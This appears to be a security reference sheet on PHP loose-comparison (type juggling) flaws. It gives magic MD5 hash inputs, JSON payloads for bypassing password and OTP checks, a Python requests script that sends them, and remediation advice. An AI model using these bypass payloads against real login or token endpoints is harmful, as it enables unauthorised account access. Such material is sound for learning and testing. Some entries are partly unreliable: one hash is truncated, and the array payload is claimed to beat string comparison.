# API Reference: Type Juggling Vulnerabilities

## PHP Loose Comparison (==) vs Strict (===)

### Dangerous Comparisons
| Expression | Result | Why |
|-----------|--------|-----|
| `0 == "string"` | TRUE | String cast to int = 0 |
| `"0e123" == "0e456"` | TRUE | Both treated as 0 (scientific notation) |
| `true == "anything"` | TRUE | Non-empty string is truthy |
| `NULL == ""` | TRUE | Both falsy |
| `[] == false` | TRUE | Empty array is falsy |

## Magic Hash Strings

### MD5 Hashes Starting with 0e
| Input | MD5 Hash |
|-------|----------|
| 240610708 | 0e462097431906509019562988736854 |
| QNKCDZO | 0e830400451993494058024219903391 |
| aabg7XSs | 0e087386482136013740957780965295 |
| aabC9RqS | 0e041022518165728065344349536617 |

### SHA1 Hashes Starting with 0e
| Input | SHA1 Hash |
|-------|-----------|
| aaroZmOk | 0e17... |

## Authentication Bypass Payloads

### JSON Payloads
```json
{"username": "admin", "password": true}
{"username": "admin", "password": 0}
{"username": "admin", "password": []}
```

### Why This Works
```php
// Vulnerable PHP code
if ($password == $stored_hash) { // Loose comparison!
    authenticate();
}
// true == "any_string" => TRUE
// 0 == "non_numeric_string" => TRUE (PHP < 8.0)
```

## Token/OTP Bypass

### Loose Comparison on Tokens
```php
// Vulnerable
if ($_POST['token'] == $valid_token) { ... }

// Attack: send integer 0
// 0 == "a1b2c3..." => TRUE (PHP < 8.0)
```

### JSON Type Manipulation
```json
{"otp": 0}      // 0 == "123456" in PHP < 8.0
{"otp": true}   // true == "123456" is TRUE
```

## Testing with requests

```python
import requests
# Boolean bypass
resp = requests.post(url, json={"password": True})
# Integer bypass
resp = requests.post(url, json={"password": 0})
# Array bypass
resp = requests.post(url, json={"password": []})
```

## PHP 8.0 Changes
- `0 == "string"` now returns FALSE (fixed)
- `0 == ""` now returns FALSE
- Still vulnerable: `"0e123" == "0e456"` returns TRUE

## Remediation
1. Always use strict comparison (`===`)
2. Validate input types before comparison
3. Use `password_verify()` for passwords
4. Use `hash_equals()` for timing-safe comparison
5. Upgrade to PHP 8.0+
